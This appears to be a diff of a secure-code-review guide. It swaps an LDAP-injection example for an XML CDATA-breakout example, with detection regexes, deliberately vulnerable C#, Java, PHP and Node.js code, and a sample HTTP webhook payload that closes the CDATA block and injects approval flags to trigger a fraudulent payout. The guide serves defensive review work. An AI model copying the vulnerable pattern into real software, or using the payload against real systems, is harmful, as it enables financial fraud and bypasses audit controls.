-\b(?:Filter\s*=\s*\$?".*\(objectClass=user\).*\{|\bFilter\s*=\s*.*\+\s*[a-zA-Z_][a-zA-Z0-9_]*|SearchRequest\s*\([^)]*Filter\s*=|DirectorySearcher\s*\{[\s\S]{0,120}?Filter\s*=)
+\b(?:xml\s*\+=\s*.*<!\[CDATA\[.*\]\]>|StringBuilder[\s\S]{0,150}<!\[CDATA\[|string\.Format\s*\(.*<!\[CDATA\[%s?\]\]>|XCData\s*\(|XmlWriter[\s\S]{0,120}?WriteCData)
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```regexp
-\b(?:searchFilter\s*=\s*".*\(objectClass=user\).*\+\s*|new\s+SearchControls|DirContext\.search\s*\(|LdapQueryBuilder[\s\S]{0,120}?filter)
+\b(?:String\.format\s*\(.*<!\[CDATA\[%s\]\]>|StringBuilder[\s\S]{0,150}<!\[CDATA\[|CDATASection|createCDATASection\s*\(|XMLStreamWriter[\s\S]{0,120}?writeCData)
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```regexp
-\b(?:ldap_search\s*\(.*['"]\s*\.\s*(?:str_replace|addslashes)?\s*\(?\$|ldap_search\s*\(.*\$filter|ldap_list\s*\(.*\$filter)
+\b(?:\$xml\s*\.\=\s*".*<!\[CDATA\[|sprintf\s*\(.*<!\[CDATA\[%s\]\]>|DOMDocument|createCDATASection\s*\(|XMLWriter)
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```regexp
-\b(?:filter:\s*`.*\(objectClass=user\).*\$\{|filter\s*:\s*['"].*\+\s*[a-zA-Z_]|client\.search\s*\(|ldapjs[\s\S]{0,120}?filter)
+\b(?:xmlPayload\s*\+=\s*`<!\[CDATA\[\$\{|`[\s\S]*<!\[CDATA\[\$\{|xmlbuilder|builder\.dat\s*\(|fast-xml-parser)
 ```
 {% endtab %}
 {% endtabs %}
@@ -617,25 +748,25 @@ class SamlProvisioningService {
 {% tabs %}
 {% tab title="C#" %}
 ```regexp
-Filter\s*=.*\(objectClass=user\).*\{|Filter\s*=.*\+.*|DirectorySearcher.*Filter
+xml\s*\+=\s*.*<!\[CDATA\[.*\]\]>|StringBuilder.*<!\[CDATA\[|string\.Format\(.*<!\[CDATA\[
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```regexp
-searchFilter\s*=.*\(objectClass=user\).*\+|DirContext\.search\(|LdapQueryBuilder.*filter
+String\.format\(.*<!\[CDATA\[%s\]\]>|StringBuilder.*<!\[CDATA\[|createCDATASection\(
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```regexp
-ldap_search\(.*\$filter|ldap_search\(.*str_replace|ldap_list\(.*\$filter
+\$xml\s*\.\=\s*".*<!\[CDATA\[|sprintf\(.*<!\[CDATA\[%s\]\]>|createCDATASection\(
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```regexp
-filter:\s*`.*\$\{|filter\s*:\s*['"].*\+|client\.search\(
+xmlPayload\s*\+=\s*`<!\[CDATA\[\$\{|builder\.dat\(|`.*<!\[CDATA\[
 ```
 {% endtab %}
 {% endtabs %}
@@ -645,24 +776,26 @@ filter:\s*`.*\$\{|filter\s*:\s*['"].*\+|client\.search\(
 {% tabs %}
 {% tab title="C#" %}
 ```csharp
-public class SamlProvisioningService 
+public class WebhookToXmlTranslator 
 {
-    private readonly LdapConnection _ldapConnection;
+    private readonly IMessageQueue _queue;
 
-    public async Task<List<string>> HydrateUserRolesAsync(SamlAssertion assertion) 
+    public async Task IngestInvoiceAsync(InvoiceDto jsonInvoice) 
     {
         // [1]
-        var departmentClaim = assertion.GetClaim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/department");
-
         // [2]
         // [3]
-        // [4]
-        var searchFilter = $"(&(objectClass=user)(department={departmentClaim}))";
-        
-        var request = new SearchRequest("DC=enterprise,DC=local", searchFilter, SearchScope.Subtree, "memberOf");
-        var response = (SearchResponse)await Task.Factory.FromAsync(_ldapConnection.BeginSendRequest, _ldapConnection.EndSendRequest, request, null);
+        var xmlPayload = $@"<?xml version='1.0' encoding='UTF-8'?>
+            <Invoice>
+                <VendorId>{jsonInvoice.VendorId}</VendorId>
+                <Amount>{jsonInvoice.Amount}</Amount>
+                <IsApproved>false</IsApproved>
+                <RequiresAudit>true</RequiresAudit>
+                <Justification><![CDATA[{jsonInvoice.JustificationNote}]]></Justification>
+            </Invoice>";
 
-        return ExtractRolesFromLdapResponse(response);
+        // [4]
+        await _queue.PublishAsync("invoice-processing", xmlPayload);
     }
 }
 ```
@@ -671,26 +804,29 @@ public class SamlProvisioningService
 {% tab title="Java" %}
 ```java
 @Service
-public class SamlProvisioningService {
+public class WebhookToXmlTranslator {
 
     @Autowired
-    private LdapTemplate ldapTemplate;
+    private MessageQueue queue;
 
-    public List<String> hydrateUserRoles(SamlAssertion assertion) {
+    public void ingestInvoice(InvoiceDto jsonInvoice) {
         // [1]
-        String departmentClaim = assertion.getAttribute("Department");
-
         // [2]
         // [3]
-        // [4]
-        String searchFilter = "(&(objectClass=user)(department=" + departmentClaim + "))";
-        
-        List<String> roles = ldapTemplate.search(
-            query().base("DC=enterprise,DC=local").filter(searchFilter),
-            (AttributesMapper<String>) attrs -> (String) attrs.get("memberOf").get()
+        String xmlPayload = String.format(
+            "<?xml version='1.0' encoding='UTF-8'?>\n" +
+            "<Invoice>\n" +
+            "    <VendorId>%s</VendorId>\n" +
+            "    <Amount>%f</Amount>\n" +
+            "    <IsApproved>false</IsApproved>\n" +
+            "    <RequiresAudit>true</RequiresAudit>\n" +
+            "    <Justification><![CDATA[%s]]></Justification>\n" +
+            "</Invoice>",
+            jsonInvoice.getVendorId(), jsonInvoice.getAmount(), jsonInvoice.getJustificationNote()
         );
 
-        return roles;
+        // [4]
+        queue.publish("invoice-processing", xmlPayload);
     }
 }
 ```
@@ -698,24 +834,26 @@ public class SamlProvisioningService {
 
 {% tab title="PHP" %}
 ```php
-class SamlProvisioningService 
+class WebhookToXmlTranslator 
 {
-    protected $ldapConnection;
+    protected $queue;
 
-    public function hydrateUserRoles(SamlAssertion $assertion): array 
+    public function ingestInvoice(InvoiceDto $jsonInvoice): void 
     {
         // [1]
-        $departmentClaim = $assertion->getAttribute('Department');
-
         // [2]
         // [3]
-        // [4]
-        $searchFilter = "(&(objectClass=user)(department={$departmentClaim}))";
-        
-        $search = ldap_search($this->ldapConnection, "DC=enterprise,DC=local", $searchFilter, ['memberOf']);
-        $entries = ldap_get_entries($this->ldapConnection, $search);
+        $xmlPayload = "<?xml version='1.0' encoding='UTF-8'?>
+            <Invoice>
+                <VendorId>{$jsonInvoice->vendorId}</VendorId>
+                <Amount>{$jsonInvoice->amount}</Amount>
+                <IsApproved>false</IsApproved>
+                <RequiresAudit>true</RequiresAudit>
+                <Justification><![CDATA[{$jsonInvoice->justificationNote}]]></Justification>
+            </Invoice>";
 
-        return $this->extractRoles($entries);
+        // [4]
+        $this->queue->publish('invoice-processing', $xmlPayload);
     }
 }
 ```
@@ -723,30 +861,22 @@ class SamlProvisioningService
 
 {% tab title="Node.js" %}
 ```javascript
-class SamlProvisioningService {
-    static async hydrateUserRoles(assertion) {
+class WebhookToXmlTranslator {
+    static async ingestInvoice(jsonInvoice) {
         // [1]
-        let departmentClaim = assertion.attributes['Department'];
-
         // [2]
         // [3]
+        let xmlPayload = `<?xml version='1.0' encoding='UTF-8'?>
+            <Invoice>
+                <VendorId>${jsonInvoice.vendorId}</VendorId>
+                <Amount>${jsonInvoice.amount}</Amount>
+                <IsApproved>false</IsApproved>
+                <RequiresAudit>true</RequiresAudit>
+                <Justification><![CDATA[${jsonInvoice.justificationNote}]]></Justification>
+            </Invoice>`;
+
         // [4]
-        let searchFilter = `(&(objectClass=user)(department=${departmentClaim}))`;
-
-        let opts = {
-            filter: searchFilter,
-            scope: 'sub',
-            attributes: ['memberOf']
-        };
-
-        return new Promise((resolve, reject) => {
-            ldapClient.search('DC=enterprise,DC=local', opts, (err, res) => {
-                let roles = [];
-                res.on('searchEntry', (entry) => roles.push(entry.object.memberOf));
-                res.on('end', () => resolve(roles));
-                res.on('error', (err) => reject(err));
-            });
-        });
+        await queue.publish('invoice-processing', xmlPayload);
     }
 }
 ```
@@ -755,11 +885,37 @@ class SamlProvisioningService {
 {% endstep %}
 
 {% step %}
+\[1] The API Gateway acts as the translation layer, accepting modern JSON webhooks from vendors and compiling them into rigid XML documents for the internal event-sourcing engine, \[2] The backend enforces strict default security configurations: all incoming invoices are explicitly marked as `IsApproved: false` and `RequiresAudit: true,` \[3] To support rich-text descriptions from the vendor's CRM without crashing the downstream XML parser on unescaped ampersands or brackets, the developer wraps the justification payload in a CDATA section, \[4] The fatal encapsulation failure. Because the developer assumes CDATA blocks represent absolute containment boundaries, they fail to strip the literal sequence `]]>` from the incoming JSON string. The attacker leverages this to prematurely terminate the CDATA context, re-entering the active XML execution space. The downstream parser accepts the duplicate state-mutating nodes, overriding the default security properties via last-node-wins resolution
 
+```http
+// 1. Attacker (Malicious Vendor) submits a massive, fraudulent invoice via the JSON API.
+// 2. Attacker injects the CDATA termination sequence followed by state-overriding XML nodes.
+POST /api/v1/invoices/webhook HTTP/1.1
+Host: gateway.enterprise.tld
+Authorization: Bearer <vendor_api_token>
+Content-Type: application/json
+
+{
+  "vendorId": "VND-9912",
+  "amount": 8500000.00,
+  "justificationNote": "Services rendered.]]></Justification><IsApproved>true</IsApproved><RequiresAudit>false</RequiresAudit><Justification><![CDATA["
+}
+```
+
+```http
+// 3. The API Gateway string-interpolates the payload into the XML Document.
+// 4. The downstream Accounting Engine parses the message queue event:
+// <Justification><![CDATA[Services rendered.]]></Justification>
+// <IsApproved>true</IsApproved>
+// <RequiresAudit>false</RequiresAudit>
+// <Justification><![CDATA[]]></Justification>
+
+// 5. The engine evaluates the invoice, registers IsApproved=true, and schedules the immediate payout.
+```
 {% endstep %}
 
 {% step %}
-
+To ensure continuous ingestion of third-party financial data, the API Gateway utilized CDATA blocks to insulate the strict downstream XML parser from unpredictable text formatting. By assuming that CDATA elements function as absolute cryptographic boundaries, the architecture explicitly omitted structural input sanitization. The attacker exploited this by providing the exact byte sequence required to terminate the CDATA block (`]]>`), instantly escaping the data context and returning to the executable DOM space. The injected nodes permanently altered the state properties of the invoice. The downstream accounting engine processed the perfectly valid XML document, accepted the injected approval flags over the defaults, and automatically authorized a fraudulent multi-million dollar payout without triggering human review mechanisms
 {% endstep %}
 {% endstepper %}
 
